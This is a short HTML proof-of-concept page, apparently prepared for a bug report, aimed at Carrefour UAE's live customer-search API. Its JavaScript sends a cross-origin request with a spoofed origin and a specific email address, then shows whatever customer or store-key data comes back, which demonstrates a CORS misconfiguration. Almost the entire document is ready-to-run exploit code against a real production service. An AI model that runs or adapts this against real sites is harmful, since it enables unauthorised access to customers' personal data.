<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Carrefour UAE - Get Store Key PoC</title>
  <style>
    body {
      font-family: sans-serif;
      background: #f4f4f4;
      padding: 20px;
    }
    button {
      padding: 10px 15px;
      font-size: 16px;
      cursor: pointer;
    }
    pre {
      background: #fff;
      padding: 15px;
      border: 1px solid #ccc;
      white-space: pre-wrap;
      max-height: 500px;
      overflow: auto;
    }
  </style>
</head>
<body>
  <h2>üö® CORS PoC ‚Äì Get Store Key</h2>
  <button id="fetchBtn">Fetch Store Key</button>
  <pre id="output">Click the button above to fetch response from target API.</pre>

  <script>
    document.getElementById("fetchBtn").addEventListener("click", fetchStoreKey);

    function fetchStoreKey() {
      document.getElementById("output").textContent = "‚è≥ Fetching...";

      fetch("https://www.carrefouruae.com/v2/customers/channel/search?email=fohof13749%40modirosa.com", {
        method: "GET",
        mode: "cors",
        headers: {
          "Appid": "Web",
          "Langcode": "en",
          "Origin": "https://me.com",
          "Referer": "https://me.com",
          "Env": "prod",
          "Lang": "en",
          "Storeid": "mafuae"
        }
      })
      .then(response => response.text())
      .then(data => {
        document.getElementById("output").textContent = data;
      })
      .catch(error => {
        document.getElementById("output").textContent = "‚ùå Request failed:\n" + error;
      });
    }
  </script>
</body>
</html>
